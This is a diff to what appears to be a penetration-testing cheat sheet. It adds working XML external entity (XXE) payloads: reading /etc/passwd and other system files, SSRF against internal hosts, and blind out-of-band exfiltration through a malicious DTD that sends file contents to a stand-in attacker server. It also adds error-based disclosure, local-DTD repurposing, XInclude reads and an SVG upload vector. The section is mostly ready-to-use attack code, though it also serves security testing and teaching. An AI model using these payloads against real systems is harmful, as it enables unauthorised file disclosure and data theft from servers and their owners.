@@ -841,13 +841,98 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 
 ### <ins>XXE injection</ins>
 
-- Try with xinclude to achieve SSRF or LFI;
+- **Exploiting XXE to retrieve files**<br/>
+  Original
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck><productId>381</productId></stockCheck>
+  ```
+  Modified
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <stockCheck><productId>&xxe;</productId></stockCheck>
+  ```
+- **Exploiting XXE to perform SSRF attacks**
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerablewebsite.com/"> ]>
+  ```
+- **Exploiting blind XXE exfiltrate data out-of-band**<br/>
+  Example
+  ```xml
+  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
+  ```
+- **Exfiltrate data out-of-band**<br/>
+  for-the-malicious-web-server.dtd
+  ```dtd
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webattacker.com/?x=%file;'>">
+  %eval;
+  %exfil;
+  ```
+  Submit to vulnerable server
+  ```xml
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://webattacker.com/malicious.dtd"> %xxe;]>
+  ```
+- **Exploiting blind XXE to retrieve data via error messages**
+  ```dtd
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+  ```
+- **Exploiting blind XXE by repurposing a local DTD**<br/>
+  Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`
+  ```
+  <!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+  <!ENTITY % custom_entity '
+  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
+  &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+  &#x25;eval;
+  &#x25;error;
+  '>
+  %local_dtd;
+  ]>
+  ```
+  To locate the DTD file, submit the payload
+  ```xml
+  <!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM
+  "file:///usr/share/yelp/dtd/docbookx.dtd">
+  %local_dtd;
+  ]>
+  ```
+- **Try with xinclude to achieve SSRF or LFI**
   ```XML
   <?xml version="1.0" encoding="utf-8" ?>
   <username xmls:xi="https://w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///c:/windows/win.ini">
   </username>
   ```
+
+Attack surfaces
+- **XInclude attacks**
+  ```xml
+  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/></foo>
+  ```
+- **XXE attacks via file upload with** `.svg`
+  ```svg
+  <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITYxxe SYSTEM "file:///etc/hostname" > ]>
+  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+  </svg>
+  ```
+- **XXE attacks via modified content type**<br/>
+  For example, Content-Type: `application/x-www-form-urlencoded` -> `Content-Type: text/xml`
+
+Manually testing for XXE vulnerabilities generally involves
+- Testing for file retrieval
+- Testing for blind XXE vulnerabilities
+- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document
+
 
 
 ### <ins>Cross-site scripting (XSS)</ins>
